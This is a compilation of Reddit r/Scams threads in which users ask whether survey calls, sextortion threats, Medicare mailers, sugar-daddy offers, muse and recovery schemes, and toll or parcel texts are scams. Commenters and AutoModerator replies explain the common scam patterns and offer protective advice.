Body: This lady has been contacting me and states they are from MEPS. They claim that if I log on a zoom meeting with them and discuss my medical information, they‚Äôll send me $50 gift card. My meeting is tomorrow and the lady sounds very pushy. The reason I‚Äôve been contacted is because MEPS is interviewing the US population to gauge our health and such. I‚Äôm not sure how I feel about this, especially since they state they‚Äôre from MEPS and I read that MEPS doesn‚Äôt contact civilians. Additionally, I‚Äôm not sure how I feel about giving a random stranger my medical information. Do you think this is a scam? Anyone else contacted by MEPS?

- No idea what MEPS is but I would NEVER tell any random person my medical history, much less for 50 bucks.
- Did you participate in the National Health Interview Survey (NHIS) last year?  If so, this might be real.

You can read about MEPS at their website [https://meps.ahrq.gov/communication/household\_participant\_faqs.jsp#3](https://meps.ahrq.gov/communication/household_participant_faqs.jsp#3) and decide for yourself.

According to that website  they do pay $50 for completing the survey, so it might be real.

>I read that MEPS doesn‚Äôt contact civilians

That's a different MEPS, it also stands for Military Entrance Processing Station.
- https://preview.redd.it/c46e4at987ee1.png?width=1080&format=png&auto=webp&s=d3c2b124629b18c2377e2bdccc8bff3fb5f60640

Maybe?
- MEPS is not _just_ a military acronym like everyone else is saying.  It's also an acronym for the Medical Expenditure Panel Survey, and they do in fact offer $50 for participation.

Whether or not this is the _real_ MEPS I can't say.  Their website claims that:

>The Household Component (HC) collects data from a sample of families and individuals in selected communities across the United States, drawn from a nationally representative subsample of households that participated in the prior year's National Health Interview Survey (conducted by the National Center for Health Statistics). 

Did you or someone in your household participate in the National Health Interview Survey last year?
- I have participated in a MEPS because I participated in the National Health Interview Survey ( NHIS). It was all extremely thoroughly explained, I was given a packet about what the questions were and why they were being asked, and the questions were all standardized and not personalized to me in any. The entire point of it is to report how much money Americans are spending on medical costs and how insurance has benefitted them. 

They did an initial interview and then a second follow-up 6 months later. They did give me the money as well. My point is, this could be legitimate if you completed the NHIS. I would just ask a few questions, including how and why they contacted you, before you start. They should be able to give those answers easily. [Here's additional information about them.](https://meps.ahrq.gov/mepsweb/about_meps/survey_back.jsp) 

This could still be a scam, but I have had a legitimate experience with this group.
- Why don‚Äôt you contact MEPS directly using their ‚Äúcontact us‚Äù details on their site and ask them if this is legit. 

100% this is a scam, but that is just my opinion.
- Medical research is real and they will sometimes do stuff like this. In my experience with Huntintons disease, I was the spouse and considered a control. It should be easy to verify with the control board associated with a university that this group is approved.
- What is MEPS?
- If MEPS site tells you they do not contact you then leave it at that and don‚Äôt have that meeting‚Ä¶‚Ä¶.. if it some good for you MEPS will communicate with you like normal‚Ä¶.. anytime someone tell you it‚Äôs now or never‚Ä¶‚Ä¶..tell the BYE it‚Äôs never! It‚Äôs BS
- I all
My 70 years the government of any form does not call you, they send a letter or come to your door. Listen to your instincts‚Ä¶‚Ä¶.the fact you are questioning it makes it a hard NO
- Nobody here knows what MEPS is.
- [deleted]
- People don't pay you for your medical info usually, in fact your usually the one that has to pay someone else your medical info, it's called a doctor.
- Meps is Military Entrance Processing Station.   It‚Äôs where the military recruits go to get inspected, injected and all kinds of mean nasty ugly things to see if they are fit enough to join the military.  Did you speak to a recruiter for any branch of the military?
- MEPS is the Military Entrance Processing Station.  It's where your recruiter will take you after you express an interest in the service.  You'll get physicals and what not to make sure that you're fit for duty, as well as any other tests that are needed for your rate.  You will eventually swear in here, and go to your basic training.

THEY DO NOT CALL PEOPLE.

This is a scam.
- I had to Google what MEPS is (part of the U.S. military that screens recruits), and there's no way they would pay civilians $50 for their opinions. If they wanted to conduct a study or survey, they would pay a contractor tens of millions of dollars to do it on their behalf. That's just the way the U.S. government (and military) works.
- I feel like the scam isn't risking medical info for $50. I think someone giving up their medical info at all is a scam in and of itself.
- I asked and the lady contacted me. She said they‚Äôre from the Medical Expenditure Panel Survey (MEPS).
- It is the Medical Expenditure Panel Survey. I didn‚Äôt participate in the NHIS last year, so it was confusing to have MEPS contact me out of the blue. I‚Äôve never heard of it before.
- I didn‚Äôt participate last year and I‚Äôm in my own household. Could it be family members outside my household?
- I‚Äôm glad to hear that MEPS is a real thing! The lady is sounding more legit, but I‚Äôm still tentative. She didn‚Äôt roll out the red carpet for me and roughly explained what‚Äôs going on. No packet was involved. I‚Äôm not sure if she was having a bad day, but seemed a bit too pushy for my liking.
- The website I received does look pretty legit. I believe it‚Äôs supposed to be anonymous, so there‚Äôs no way I‚Äôm giving out my SSN and such.
- ^ This
- I‚Äôll search more for the control board to verify.
- Just found out it stands for Medical Expenditure Panel Survey.
- I agree about the now or never portion. MEPS is sounding more legit, but the way she spoke sounded a bit too pushy and eager. Kind of like she didn‚Äôt want to take no for an answer.

In this context, MEPS is the Medical Expenditure Panel Survey: https://meps.ahrq.gov/mepsweb/about_meps/survey_back.jsp

- I asked the lady to clarify what MEPS means. I was told Medical Expenditure Panel Survey. This is a legitimate site, but I‚Äôm still tentative. I was given little to no information and had to ask for more‚Ä¶ to even know what organization the lady was from
- I would guess they are probably understaffed like most government agencies and she  likely has a huge workload. That would make anyone grumpy. But my interview was also in person, not online. Just ask your questions ahead of time and decide if you want to participate. It's entirely voluntary so you can just say no.
- Wait, you didn't shorten it yourself? THEY only called themselves that with no explanation what it stands for?
- Thank you for continuing to correct people. Why do people assume an acronym only has one meaning?
- Yes, they called with no explanation on what MEPS is. I asked them later to clarify what MEPS actually stands for and I was told Medical Expenditure Panel Survey. This is a legitimate group, but the way the lady presented it to me was odd and off putting.
- Why do people post (as OP did) assuming others know what some random initials agency name means?

I‚Äôm sure there are another dozen or so MEP‚Äôs in the world. And we still don‚Äôt know which one is purported to have contacted OP.
- I found out the lady is supposedly from the Medical Expenditure Panel Survey.

Title: Need help if this is a scam or sextortion?
Body: So matched with a girl on badoo (dating app) who said she was 18 and we move in to WhatsApp and had casual chat no nudes nothing. She then proceeds to tell me she's 15 and sends me a photo of her (maybe not her if a scam?) in school uniform to which I just reply "sorry, you're too young" and leave it there. 
I wake up to the conversation wiped and blocked on WhatsApp and a private number call today from a British guy (this is in the UK) saying (not exact words and just the jist) "hi we are from some organisation and have received word that a conversation had arisen between you and a minor and that you've been sending indecent images to them" then proceeds to list all the laws and what could happen and says that I've  deleted the chat on WhatsApp when I haven't been on it since. I
I think he mentioned my first name but had no idea where I was located or nothing  else. Then said he'll send the police round by 6pm to talk to me if I rather talk face to face or to go to a police station and hand my phone in to which I gave a bogus location.
I agreed too and he said he's gonna put me on hold and as he did I hung up as just felt fishy. Proceeded to spam call me back about 8 times but hasn't called me back for the past 2 hours.
Is this a legitimate thing I'm gonna have to fight? I've been very anxious and nervous

- Classic !underage scam (see the AutoModerator reply to my comment for more info). There's nothing to worry about. Just block and ignore.
- If it's on Whatsapp, it's going to be a scam...
- it is a scam, and its impossible to stop anyone from sending pictures if you hey have your info, tell them you lied about your age and you that your a minor and you are trying to scam me, or blackmail me into sex trafficking and ask them if they still want to talk
- I thought as much. For some reason can't block the private number. Just worried cause they never actually said about giving them money.
Thank you for your help
- Hi /u/MultiFazed, AutoModerator has been summoned to explain the Underage scam.

This scam usually starts on a dating app and you will encounter a normal woman whose profile says she is above 18. Later you will be contacted and told that the girl is underage. They'll usually pose as the girl's father, another family member, or a police officer. They will tell you that your life will be ruined and you will be a sex offender, but will offer you the chance to pay them to make the problem go away. The stories they use as to why you need to fork over money vary, but the common ones include therapy for the girl, payment for a broken phone or computer, etc.

Of course, there is no girl and no crime has been committed, so if you are involved in this scam all you need to do is ignore their threats and move on with your life. The scammers may contact you again in the future after you block/ignore them, so be ready in case that happens. If you have already sent money to the scammers, you should try to dispute the transaction and see if you can get your money back. This is a [very common scam](https://www.reddit.com/r/Scams/search/?q=underage&include_over_18=on&restrict_sr=on&t=all&sort=new) and [here](https://www.wired.com/story/the-phone-call-from-hell/) are [some](https://www.wcnc.com/article/news/crime/teen-says-hes-the-victim-of-a-sextortion-scam/275-21216b29-df76-44f4-b20a-cb726e19d42e) relevant news [articles](https://www.jbsa.mil/News/News/Article/1503978/sextortion-scams-continue-to-occur-dont-give-into-scammers-demands/).

NOTE: Scammers pretend to be underage boys as well and the text above still applies, but it's called the underage girl scam as those are the vast majority of cases.

Title: Receiving Medicaid mail, as I‚Äôm turning 65 soon ( but I‚Äôm not)
Body: I‚Äôve recently been receiving a bunch of mail from multiple sources, in regard to Medicare options when I turn 65.  Some of it seems to be from official government agencies. 

I‚Äôm only 40 however, so this isn‚Äôt correct.  I know my data was breached in a massive hack in the last year.  

Is this simply the case that someone has signed me up on a mailing list?  Or could there be something more dangerous going on, like Social Security fraud?  

I know there are places to report SS fraud, but was interested in getting any advice or opinions here first. 

Thanks in advance!

- 1) This is not Medicaid (which you have in your title)

2 This is not Medicare, it is for Medicare supplemental insurance (sometimes called Medigap) which is something you might consider buying from a private insurance company to cover things that Medicare doesn‚Äôt cover.
- It's just an advertisement. Just pitch it.
- [https://abc6onyourside.com/on-your-side/official-looking-document-not-from-us-government](https://abc6onyourside.com/on-your-side/official-looking-document-not-from-us-government)
- My 34 yo daughter gets this stuff. Her info was also in a data breach last year. But then whose hasn‚Äôt been??
- This is not a scam, exactly, but a crappy company trying to sell you crappy insurance coverage. Somewhere in the digital realm is a piece of info that says you're 55 or older. That piece of info got sold to data brokers and now you are getting tons of promotional materials from for-profit crappy insurance companies trying to sell you Medicare plans. When you actually do turn 55 or so, you'll be getting floods of this stuff.

You don't have to become knowledgeable about this for a couple more decades, but basically: there are different parts to Medicare coverage. Some coverage is free through the government, while some parts are purchased at negotiated prices through regular health insurance companies. When the time comes to buy those plans, you'll do careful research about the options and costs. But if there's one industry that is full of crappy crappy options, it's the US for-profit health-insurance industry.

TL;DR: Throw it away.

  
EDIT: actually this one might be a scam, a fake insurance offer.
- The return address on the letter is for a UPS Store that leases private mailboxes, not a government office.  Definitely scammy, if not an outright scam.
- "REGISTERED DOCUMENT"? I can't use words here to describe how wrong that is. Do you want to have any contact with a group that starts with an outright lie?

My guess is that they will ask for your medicare number or, lacking that, your social security number and claim that they need that to verify what coverage you are qualified for, but quite possibly end up using that information for medicare fraud or identity theft.
- It's a scummy ad

- Gah, thanks‚Ä¶ yeah that was a mistake on my part in the title!
- Like it says when reading the small print on the mailer:

>THIS INFORMATION IS NOT AFFILIATED WITH OR ENDORSED BY GOVERNMENT AGENCIES. YOU MAY BE CONTACTED BY A INSURANCE LICENSED REPRESENTATIVE

Title: I can‚Äôt take it, this has to be a scam
Body: For 3 or 4 weeks now, I‚Äôve gotten calls, sometimes up to half a dozen a day from a group calling themselves ‚ÄúSenior Solutions‚Äù. They aren‚Äôt looking for me, they are looking for a family member whose name has been tied to my phone number in some of the online record databases. I told them nicely the first time that they had the wrong number, and asked them to stop calling. Then after the second or third time, I wasn‚Äôt so nice. Today marks the next attempt, they called back to back about 5 minutes apart. The first time I ignored it, so they tried again. Second time I picked up and let them have it. I want to know who they are and how to make them stop. It‚Äôs infuriating. According to my contacts app the phone number is a verified number suggesting legitimacy, but it doesn‚Äôt show up to anyone when searched. What can I do here? Ignoring them just makes them call more.

- Block them and set your phone to silence unknown callers.
- It's a scam, or it's just some company trying to sell you something. Either way, everyone gets these calls, some people get 10-20-30 calls a day.

Do not answer. If you answer, they know your phone number is active, and you'll get more calls. Yelling and swearing at them won't stop them from calling back: good salespeople are immune to this, and scammers expect it.

Here is something that may work: when the phone rings, answer but do not say anything. Wait silently for 30 seconds, then hang up. Another Redditor reports that it has reduced the calls they get (it fools the automated robocall system).

The phone number displayed is probably not their real number, it belongs to some innocent person who knows nothing about the calls. The scammers use technology to spoof the number they're calling from -- so the number displayed on your phone has your area code, or it may even appear to be from your local police; but they are actually calling from across the country, or from somewhere in Asia.
- If you think it's a legitimate and they keep contacting you, report them to the FTC ans FCC.
- Just block them.
- It might also be a bill collector. Phone numbers can easily be spoofed so you really don't know who is calling. Just don't answer calls from unknown numbers.

- >what is the scam here?

It should be obvious. You send him $50 and he sends you nothing.
- **No one** is giving out free money on the internet. No one. 

Block them. Ignore them. Stop seeking money from strangers.
- Nobody wants to give you money for ‚Äúnaughty reasons‚Äù. You‚Äôre being scammed because you‚Äôre gullible enough to believe a stranger wants to give you $500
- Repeat this to yourself in front of a mirror ten times a day: "All free internet money is a scam."
- You don't earn money by giving it to someone.
- He's asking you to send him $50 and you're asking what the scam is?  Bloody hell.
- Great way to get sextorted, I'm seeing !sugar being used more and more for that one. If you don't want to have your pics potentially spread everywhere don't do it.  Either way it's a scam.  And that community you belong to? Probably loaded with scammers as well, especially if it's a Reddit NSFW sub.
- !advancefee

!sugar

Read below. The scam is that you‚Äôll send 50 bucks over and get nothing in return
- You send $50, they ghost you. That's it: since this is through "Friends and Family" you have no recourse and you are left with PayPal's extortionate fees to pay as well.
- Your naughty photos are valuable to scammers because they‚Äôll use them for years to con older men into sending them money. 

If you got an email from PayPal saying you had to upgrade your account or something because your customer has a business account, double check the email and you‚Äôll likely find that the email is not really from PayPal, or it‚Äôs a email from PayPal using the invoicing function.

At any rate, there‚Äôs zero chance this is legit, it‚Äôs such a common scripted scam that the community has established auto response bots for them - which other commenters have already triggered. 

Here‚Äôs something from my experience in sales that might help you: you‚Äôre the seller - you set the terms of the sale, not the customer. 

You cannot walk into a 7/11 and say ‚ÄúI know these Fritos are $2.99 but will you take this Madonna CD and this half used stick of deodorant?‚Äù
- Anytime you have to pay money to get money, it is a scam. No internet rando, or anyone else is going to give you money.
- He won't wave his hand at you because he's not really on camera. You're chatting with a video, or an AI image. Everything he told you is a lie: name, location, wanting to send you money.So you send the 50, but then they disappear and you never get the 500. And other people in the group who say that they have gotten money are lying, they are part of the group of scammers.

If you send them naughty pictures, they will blackmail you to try to get more money. **All they want is to take your money.**

Are you trying to be an online sugar baby? If you are, read posts here in r/scams from people who lost money this way. There is no such thing as an online sugar daddy / sugar mamma who pays you to chat with them or show naughty pictures. It's called a !sugar scam.
- Stupid people. I can‚Äôt believe what I‚Äôm reading here.
- if any of is real, you are about to pay someone $50 to get sextorted later...
- This is a classic scam!  

They want you to send $50 first, and once they have your money, they‚Äôll disappear. No one online offers money for free, especially for "naughty" reasons. 

Stay safe and block them ASAP!
- No.  Don‚Äôt send money to get money.  They don‚Äôt want your pictures.  They want your money.

Once they have all they can get, expect them to try to blackmail you with the pictures you sent (wether they were teaser pics, or the whole package).
- Thank them and ask to be sent just $450.
- Yes. Scam. You don't pay someone to get money out of an account. Period.
- A !sugar deal?
- Have you considered asking ChatGPT these types of questions? This is exactly the sort of thing it's good at.

- Hi /u/sarcasmismygame, AutoModerator has been summoned to explain the Sugar daddy or momma scam.

Sugar dad/daddy/mom/momma scams are [very common](https://www.fraud.org/sugarbaby_alert) and usually come in two varieties: fake check style scams, and advance-fee scams. Fake check style scams involve the scammer making a fraudulent payment to you that will later be reversed, and then you making some sort of payment to the scammer that will not be reversed. Common examples include the scammer sending you a fake check and asking you to buy gift cards, or to send money via Western Union, or to purchase Bitcoins. Another common example involves the sugar scammer offering to pay your bills, or offering you banking information that you will use to pay off your bills. These bank accounts are stolen and the innocent victim will reverse the charge when they notice the fraud.

The second variety of sugar scammers use advance-fee scams, where they offer you money but require you to pay first. They may ask for you to pay them to prove that you are loyal, or they may require you to pay a processing fee. It's common for sugar scammers to send spoofed emails that look like they came from services like PayPal or CashApp that will inform you that you have received money, but that also ask for a processing fee before the funds are released.

In the real world, sugar babies are sex workers that engage in in-person sexual encounters with their clients. **We do not recommend that people try to be a sugar baby, but if this is what you are looking into, check out the following subreddits for information on how to be safe: r/SugarLifestyleForum/ and /r/SexWorkers**.

- Hi /u/Hear-that-sound, AutoModerator has been summoned to explain the Advance fee scam.

The [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam) arises from many different situations: investment opportunities, money transfers, job scams, online purchases of any type and any legality, etc., but the bottom line is always the same, you're expected to pay money to receive money. So you will pay the scammer and receive nothing.

It can be as simple as the scammer asking you to pay them upfront for an item they have listed, or as complex as a drug scam that involves an initial scam site, a scam shipping site, and fake government agents. Sometimes the scammers will simply take your first payment and dissappear, but sometimes they will take your initial payment and then make excuses that lead to you making additional payments.

If you are involved in an advance-fee scam, you should attempt to dispute/chargeback any payments sent to the scammer, you should block the scammer, and you should ignore them if they attempt to contact you again. Thanks to redditor AceyAceyAcey for this script.

- Probably, I think my guard is down more due to it being PayPal instead of banking which usually involve personal data
- Just stop right now. It‚Äôs a scam üòÇ
- If you keep asking for money for dirty pics online, you'll keep getting scammed.  This is just the internet in 2025.
- No, you can't cancel it.
- You think PayPal is going to protect you from an illegal transaction? Nope.
- Oh you already sent the $50.  Damn.  That's gone forever.
- PayPal has protection if you use Goods and Services *and* somebody illegally used your account. **But, if you use PayPal Family and Friends, or if you willingly sent money to someone, they are not going to refund it.**

Title: Why do scammers always use ‚Äúkindly‚Äù?
Body: Every time there‚Äôs a post that has kindly in it, there‚Äôs like a 99% chance it‚Äôs a scam. Why is that? Have they not heard the word please?

Comments:
- Please keep the discussion civil and on-topic. 

Offenders will be kindly shown the door, with a ban hammer pointing them the way.
- "Kindly" where an American would say "please" is 100% indicative someone learned English as a second language in a former British colony, especially India, Pakistan, and West Africa.
- There is a method to the madness.

You think "this is crazy, 99% are going to know it is a scam."

The scammer is thinking "this is a great shortcut to get to the 1% who will fall for a scam."
- "Kindly do the needful" is an Indian English shibboleth.
- You'd rather they shout "Do the f\*\*\*ing needful!"?
- [removed]
- Kindly it‚Äôs not a typical American expression, as an average American would ask to ‚Äúplease submit X‚Äù instead of ‚ÄúKindly submit X‚Äù.  

This means the original poster would either be British or from a country which learns British english as a second language, the second is the case for most of the places where scams usually come from (most Asian or African countries - best example is our old Nigerian Prince).  

Kindly words the phrase with a more polite non-demanding way of asking. Your bank would  demand you to do something ‚Äúsubmit X as soon as possible or ‚Ä¶‚Äù. They won‚Äôt even say please üòÑ
- It's British and common in formal business letters in the UK and its former colonies.
- I believe it's due to most scams originating from outside of the U.S.  

My company laid off 300+ folks stateside last summer,  and outsourced those jobs to Manila and Mumbai (one of the pitfalls of being fully remote I guess..)  Anyways almost ALL of their MS Teams chats and Outlook emails includes the word "Kindly." that it does give off scammer vibes when I read them.
- There are subtle and not so subtle regional clues in how people talk/write English. Words, expressions, grammar, style. If you are say in the USA, British expressions/words/spelling is suspicious when the writer claims to be in the US and has an "English" name. "Kindly" is tied to former British colonies in south-asian. It is rarely used in the usa, other than by migrants from that part of the world.
- i dont think they will remove the kindly 

it simply weeds out the   people who know about it 

how many people are going to string them along for weeks 

they might keep them on the phone for 20 mins  but they know anyone who thinks its a scam will just stop  wasting their time

thats why so many scams are so stupid when you sit back and think about them   its to get rid of the people who think  and  wont fall for their scam 

like we see people who think they are talking to celebs  and think they are in relationships but the celeb  has just missed a flight could they help them out   with   some money

99.99% of people would just laugh  and move on but they are looking for that other  0.01% 

so they have  to  get through hundreds of people to find them
- They've all learned English from the same place.
- I've chatted with legit Amazon reps before and they use "kindly", their names tend to be Indian.
- Because 99% of the time English isn't their first language
- If I remember what I have read correctly, the use of 'kindly' is part of their use of the English language due connection to the U.K. and being taught 'proper' English.  I may be wrong.
- "Would you kindly...?"
- Or dear.
- Part of scammer vocabulary along with ‚ÄúI hope this finds you well‚Äù.  Learn them!
- [removed]
- [removed]
- Language differences
- They also say, "I can help you with this one"
- I noticed this as well. My sister hired me to work with her, and she uses "kindly" and "good day." I've told her that makes us look like scammers, but she doesn't want to change her templates. The amount of times I've been blocked by vendors thinking I'm spam lol
- They also use the word Am, instead of I am or I'm.
- I am American and not a scammer but I use kindly sometimes.
- My parents & grandma from SE Oklahoma used "kindly" a bit. "Kindly get yore boots offen my coffee table." "Kindly go shut the back door you done left open. Were yens born in a barn?" BTW, yens and y'all were interchangeable.
- Because they all played Bioshock
- As a person from South Asia, that's just how we learn 'formal' written English. Nobody ever speaks like that, it's for emails to your professor or colleague. Now that I live in the West and know this is scammer lingo, I've had to stop writing emails like this.
- I'm re-reading the Harry Potter books and I'm noticing Dumbledore says "kindly" quite often.  So def seems like a British thing.
- On top of this, they continue to use obvious tells because they want to weed out the smarter people first.¬†


They want only the most ignorant or easy to fool people because they can maximize the scam with less work convincing the person.
- To OP, just don't forget that us Canadians sometimes say this as well. Other elements of scams should be present rather than just this word.
- Law firms also use it often. It is also an alternative to saying please, and makes your document a bit less repetitive.
- [removed]
- That's not how any of this works. That 1% will fall for any scam, there's no shortcut.
- Haha I work with factories in India and they really say 'do the needful' in actual professional emails and it's hilarious to me because every email feels like a scam
- [removed]
- Many countries use English as first/business language. But you can see on many websites/programs that they have ‚ÄúEnglish (US)‚Äù and ‚ÄúEnglish (UK)‚Äù for example. 

There are many more variants, often with different vocabulary (for example some countries say ‚Äúgas‚Äù, while other use ‚Äúpetrol‚Äù), and sometimes even different grammar (‚Äú[Euro English](https://en.m.wikipedia.org/wiki/Euro_English)‚Äù borrows some grammatical structures from French and German languages, for example).

‚ÄúKindly‚Äù is just a wording from UK English, and while it kind of fell out of favor in UK itself, it remains popular equivalent to ‚Äúplease‚Äù in business settings in Places like India, Nigeria, Philippines, where coincidentally many scammers operate out of.

- It's been a while since I read the books but are you sure dumbledore is using the word "kindly" as opposed to it describing his tone of voice.

It is used in British English (e.g "kindly pass me the salt) but no where near as much as it used to be and some of that is due to scammers.
- Yes, with MATH [https://www.microsoft.com/en-us/research/wp-content/uploads/2016/02/WhyFromNigeria.pdf](https://www.microsoft.com/en-us/research/wp-content/uploads/2016/02/WhyFromNigeria.pdf)
- Yeah, it being such a a tell means it should be easy for them to recognize and remove, unless they purposefully want the tell.  Much like how over the top many other parts of a scam often are.

- The shortcut is weeding out all of the other people that will "waste their time". It's all about getting to the victim quickly.

- I'm well aware, I'm english
- That's a lot of words to say "scammers don't want to waste time on scambaiters".
- Most scammers, just like every other profession, aren't particularily good at their jobs and just mimic what others are doing.
The better ones do know why they leave those words in there and when to take them out. The others just copy the script from the successful ones.


I expect there to be a shift away from "kindly" in the next 2-3 years as ever more scam messages will be written by generative AI.

Internet free money is never not a scam.
- Yes it's a muse scam, they commonly lead to a fake check. Remember NEVER to accept a check from a stranger. ( You could lose your money, get bank fees or worse your bank could close your account for check furad )

The scammers often use a script, you can see past threads: [https://www.reddit.com/r/Scams/search/?q=muse](https://www.reddit.com/r/Scams/search/?q=muse)

Stop engaging and block them.
- As others have said it's a muse scam, but this variation in particular is so creepy like what do you mean some dude saw your video and now a random man wants to paint you? So fucking weird.
- Did the creep mention that the painting would be 50 cm by 50 cm?  It's the preferred size for scammers for reasons not fully understood.
- Yes, it is. 

Scamming artists and art-related schenes on social media seems to be increasingly common. Just delete, block, and ignore. You haven't been scammed yet and now you're onto the grift.
- I hadn‚Äôt heard of this one yet! Adding it to my collection‚Ä¶ Thank you fellow Redditors!

Happened to me, too. As a writer, I ask random people to interview all the time (I‚Äôll be rethinking how I do it now!), so this wasn‚Äôt unusual to me. However, I looked at their TikTok and my gut said this isn‚Äôt real. Always go with your gut!

The pic is how I dealt with it. Plus, on the off chance I‚Äôm wrong, at least I wasn‚Äôt rude lol
- Hi /u/seedless0, AutoModerator has been summoned to explain the Muse scam.

The muse scam is a variant of the [fake check scam](https://consumer.ftc.gov/articles/how-spot-avoid-report-fake-check-scams) in which the scammer will contact the victim over social media and claim to want to use their image for an art project. The scammer will often use a stolen social media account to increase their credibility. They will offer a generous sum of money and offer to pay via check, and the victim is instructed to send money to the scammer for ‚Äúmaterials‚Äù via an irreversible method. The victim is under the illusion that the funds cleared when the bank makes the money available thanks to current regulations. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months.

If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. You can summon the fake check automoderator explanation using the trigger fakecheck. Thanks to redditor aNeatHat for this script.

This is a scam where a scammer impersonates an artist. For the scam where a scammer targets artists, call the automoderator trigger (artist)

- Wait till you find out how Caravaggio got his muses

- Try, "You were right, honey." 

Also, don't fall for a !recovery scam.
- Don‚Äôt buy things off people from Reddit.¬†
Don‚Äôt believe anyone who says they can help you.
- You fell for a plant (redditor 1, possibly an alt of R2), you ignored all the warnings (including in person, it seems) and for some reason you went through with it...

No, nothing can be done.
- Listen to your wife and family.
- Report the scammer to Reddit and your payment platform. Next time, use secure platforms with buyer protection.
- Next time listen

- Hi /u/IHaveBoxerDogs, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

- i will agree 9/10 but you can definitely buy things off of reddit with success.
- Yeah it was $700aud. The initial Redditor 1 has deleted the account but the Redditor 2 is still active. I‚Äôm pretty sure they are trying to scam other people as they said they will send me the tickets in 2-3 hours, which was 4 hours ago.
- Yeah thanks. Definitely won‚Äôt fall for that again.
How do you report it to reddit?
- They may be trying to scam someone else, but there's not much that can be done. They'll make or buy a new account once the current one is banned.

Just report the account and move on.
- [removed]
- Doubt you'll be able to recover the money, but you could at least write some form of PSA about this guy and the MO he used? At least that could prevent more potential victims.

Title: Did I get scammend by a seller on G2G?

The thing is that I asked the seller about this and they said "**I will ask my account provider to provide the original information from your account so that we can try to restore it**". 3 days later they said that "**Steam Support requested new information in our request about payments and CD keys, my supplier found this information and sends a response request to support."** 

But when I went to the ticket section I didn't find any tickets. 

I contacted G2G support 3 days ago (Escalated) but no answer.

- Yeah.

This is what happens when you do things that violate the TOS like buying and selling game accounts.

Watch out for !recovery scammers.
- Selling Steam accounts violates terms of service, so there should be no surprise you got hosed.

And G2G is a frequent flier in this subreddit, tons of posts about people getting hosed.
- Stop doing illegal shit and then asking for help when it goes sideways.
- Stop buying steam accounts.

An account creator can ALWAYS get their account back. You will lose your money.
- If you go outside of TOS, you are making yourself vulnerable to this kind of thing. Just comes with the territory.
- Yup, you can‚Äôt buy/sell Steam accounts. You bought a Steam account; you violated the Steam terms of service you agreed to.

Next time buy from Steam and hope they don‚Äôt connect this stolen/hijacked/fraudulent Steam account you bought to your main Steam account. Steam is well within their rights to lock you out of your main Steam account and ‚Äúdeactivate your game licenses‚Äù‚Ä¶ that‚Äôs the Steam term for permanently taking away all the games you bought.
- Of course you were scammed. Buying accounts violates Steam's ToS. Your money is gone.

Title: Advice on how to, and if to chargeback of potential scam
Body: (UK)

I've attempted to purchase a monitor via a website recommended to me via PriceRunner, this led me to a site which on the surface looked fine, it had some trust pilot reviews  (now believed to be fake), has an Instagram, and is registered as a company on the gov.uk website. 

I was then sent 'tracking info' for a parcel via a completely unknown shipping company (also registered as a company on the gov.uk website).

I received an email from this company that #1 the parcel couldn't be delivered today and will be delivered in 2 businesses days instead.

Then #2 the parcel has been lost and I will receive a full refund to my account in 5 business days.

It was not the original website that I purchased the item from that sent me the email claiming that I'll receive a refund.

Should I wait the 5 days and then claim for a chargeback when nothing comes? Or should I try chargeback now under the guise that no item was received? 

Also, should I be sending an email to the first company to request a refund incase they then say I have to wait another 5 days as it's them who have to refund me.

I do not believe a refund will come unless I chargeback and it seems to me like they're trying to weave around until my chargeback time is up and they get off with the money. I'm also not sure whether the site will stay up, and/or the business will go under while I'm waiting for the refund which according to money saving expert I should try chargeback before bankruptcy is declared by the site.

I paid using a Mastercard debit card from Santander and possibly something to do with revolut business account if that's significant.

Thoughts? All info would be greatly appreciated, specifically what to do and how to do it, and how fast I need to be about it.

**
- Do a chargeback now. Any legitimate site that refunds an order will send you an email from their site, not some random other site promising a refund.
- Okay that's what I thought. If I go to my bank requesting a chargeback is there any chance they'll come back and tell me that I have to wait the 5 days? Or will they side with me that waiting the 5 days seems wrong and a way to ensure I can't get my money back?
- Chargebacks take time to process. Might be five days give or take. But everything about the refund email from an unrelated address is suspicious.
- So because that's suspicious, it'll be alright with Santander that I've not waited and given time to the merchant to correct their mistake?
- I don‚Äôt know your bank‚Äôs specific chargeback policy. But since the refund email came from someone other than the original site you were doing business with, there‚Äôs 0 guarantee you‚Äôll see any refund money at all if you wait. It‚Äôs like ordering from Amazon and getting a refund email from bigcryptogainzzz.com.
- Okay, I'm going to give them a call, thanks for the advice fingers crossed they can get something done and the fact revolut business was used won't be an issue

Title: Same 3 scams repeatedly
Body: The last 2 months my boyfriend and I have received the same 3 scams over and over. Also had friends receive these same texts:

‚ÄúYour vehicle has an unpaid toll‚Äù

‚ÄúYou have a USPS parcel being cleared, due to the detection of an invalid zip code address‚Äù

‚ÄúWe regret to inform you that your recent order has been cancelled by the seller‚Äù then proceeds to give fake amazon web address

Is anyone else getting these texts? And have you seen a huge uptick in these since December? It‚Äôs insane. I thought about changing my phone number, but I figured it would only be a matter of time before I would start getting the same text messages again. I have a family member who fell for a really bad IRS scam several years ago and lost upwards of 50K, so it‚Äôs making me nervous that I have to constantly keep checking on older family to make sure that they‚Äôre not falling for this crap

- Everyone is getting those same text. They work and are effective for the scammers. I know someone that‚Äôs not unintelligent that was duped by the parcel one.
